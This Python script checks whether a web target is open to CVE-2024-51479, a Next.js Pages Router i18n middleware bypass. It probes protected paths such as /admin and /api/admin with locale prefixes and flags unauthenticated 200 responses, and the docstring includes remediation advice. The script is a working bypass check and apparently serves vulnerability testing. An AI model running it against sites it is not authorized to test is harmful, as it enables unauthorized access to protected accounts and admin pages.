#!/usr/bin/env python3
"""
CVE-2024-51479 — Next.js Auth Bypass in Pages Router i18n Middleware
====================================================================

CVE ID      : CVE-2024-51479
GHSA        : GHSA-7m27-7ghc-44w9
CVSS Score  : 7.5 (HIGH)
CVSS Vector : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Affected    : Next.js >= 13.0.0, < 14.2.15 (Pages Router with i18n)
Patched     : 14.2.15
Published   : 2024-11-18

Description
-----------
When Next.js Pages Router is configured with internationalization (i18n) via
`next.config.js` i18n settings, and middleware is used to protect routes,
requests to locale-prefixed paths may bypass middleware execution.

Specifically, a path like `/<locale>/protected-page` (where `<locale>` is a
configured locale such as `en`, `fr`, `de`) may not trigger the middleware
function, allowing unauthenticated access to pages that the middleware should
protect.

This affects ONLY:
  - Next.js Pages Router (not App Router)
  - Applications with i18n configuration in next.config.js
  - Routes protected exclusively via middleware

Attack Surface
--------------
- Locale-prefixed paths: /en/dashboard, /fr/admin, /de/settings
- Works when the default locale is already in the URL prefix
- App Router and non-i18n applications are NOT affected

Test Methodology
---------------
1. Check if the target uses Pages Router (presence of __NEXT_DATA__ in HTML).
2. Attempt to enumerate configured locales from HTML (lang attribute, hreflang
   links, or /__next_locale__ cookies).
3. For each candidate protected path, try accessing /<locale>/path and compare
   with accessing /path directly.
4. If /<locale>/path returns 200 while /path returns 3xx/401/403, the bypass
   is active.

Remediation
-----------
Upgrade Next.js to >= 14.2.15.
If using Pages Router with i18n, consider adding server-side auth checks in
getServerSideProps as a defense-in-depth measure independent of middleware.

References
----------
- https://github.com/advisories/GHSA-7m27-7ghc-44w9
- https://nvd.nist.gov/vuln/detail/CVE-2024-51479
"""

from __future__ import annotations

import argparse
import re
import urllib.error
import urllib.request

COMMON_LOCALES = ["en", "fr", "de", "es", "pt", "it", "nl", "ja", "ko", "zh", "ru", "ar"]

PROTECTED_PATHS = [
    "/dashboard",
    "/admin",
    "/account",
    "/profile",
    "/settings",
    "/api/user",
    "/api/admin",
    "/private",
]


def fetch(url: str, headers: dict[str, str] | None = None, timeout: int = 10) -> tuple[int, str, dict]:
    h = {"User-Agent": "NextJS-CVE-Tester/1.0", "Accept": "text/html,application/json,*/*"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read(32768).decode("utf-8", errors="replace")
            resp_headers = {k.lower(): v for k, v in resp.headers.items()}
            return resp.status, body, resp_headers
    except urllib.error.HTTPError as exc:
        body = exc.read(1024).decode("utf-8", errors="replace") if exc.fp else ""
        resp_headers = {k.lower(): v for k, v in exc.headers.items()} if exc.headers else {}
        return exc.code, body, resp_headers
    except urllib.error.URLError as exc:
        raise ConnectionError(str(exc)) from exc


def is_pages_router(body: str) -> bool:
    return "__NEXT_DATA__" in body


def detect_locales(body: str) -> list[str]:
    found = []
    # hreflang links: <link rel="alternate" hreflang="fr" href="...">
    for m in re.finditer(r'hreflang=["\']([a-z]{2}(?:-[A-Z]{2})?)["\']', body):
        lang = m.group(1).split("-")[0].lower()
        if lang not in found:
            found.append(lang)
    # html lang attribute
    m = re.search(r'<html[^>]+lang=["\']([a-z]{2})["\']', body)
    if m:
        lang = m.group(1).lower()
        if lang not in found:
            found.insert(0, lang)
    return found or COMMON_LOCALES[:4]


def is_protected(status: int) -> bool:
    return status in {301, 302, 303, 307, 308, 401, 403}


def run(target: str, timeout: int, verbose: bool) -> int:
    print(f"\n[CVE-2024-51479] Next.js Pages Router i18n Middleware Bypass")
    print(f"Target : {target}")
    print("-" * 60)

    try:
        _, body, _ = fetch(target, timeout=timeout)
    except ConnectionError as exc:
        print(f"  Connection error: {exc}")
        print("\nVERDICT : INCONCLUSIVE")
        return 2

    if not is_pages_router(body):
        print("  Target does not appear to use Pages Router (__NEXT_DATA__ not found).")
        print("\nVERDICT : NOT APPLICABLE")
        print("CVE-2024-51479 only affects Next.js Pages Router with i18n configuration.")
        return 0

    print("  Pages Router detected (__NEXT_DATA__ present)")
    locales = detect_locales(body)
    print(f"  Candidate locales: {locales}")

    bypassed: list[tuple[str, str, int, int]] = []

    for path in PROTECTED_PATHS:
        try:
            base_status, _, _ = fetch(target.rstrip("/") + path, timeout=timeout)
        except ConnectionError:
            continue

        if not is_protected(base_status):
            if verbose:
                print(f"  {path:<22} baseline={base_status} (not protected, skipping)")
            continue

        for locale in locales[:3]:  # Test first 3 locales only
            locale_path = f"/{locale}{path}"
            try:
                locale_status, _, _ = fetch(target.rstrip("/") + locale_path, timeout=timeout)
            except ConnectionError:
                continue

            flag = ""
            if locale_status == 200 and is_protected(base_status):
                bypassed.append((path, locale_path, base_status, locale_status))
                flag = "*** BYPASSED ***"

            if verbose or flag:
                print(f"  {path:<22} baseline={base_status}  {locale_path:<30} locale={locale_status}  {flag}")

            if flag:
                break  # One confirmed bypass per path is enough

    print()
    if bypassed:
        print("VERDICT : VULNERABLE")
        print("\nBypassed paths via locale prefix:")
        for path, locale_path, base_s, locale_s in bypassed:
            print(f"  {path} ({base_s}) → {locale_path} ({locale_s})")
        print("\nFix: Upgrade Next.js to >= 14.2.15")
        return 1
    else:
        print("VERDICT : PATCHED or NOT EXPLOITABLE via tested paths")
        print("\nNo locale-prefix bypass detected. Either patched or no i18n-protected routes found.")
        return 0


def main() -> int:
    parser = argparse.ArgumentParser(description="Test CVE-2024-51479 Next.js i18n middleware bypass")
    parser.add_argument("--target", default="http://localhost:3000")
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--verbose", "-v", action="store_true")
    args = parser.parse_args()
    return run(args.target, args.timeout, args.verbose)


if __name__ == "__main__":
    raise SystemExit(main())
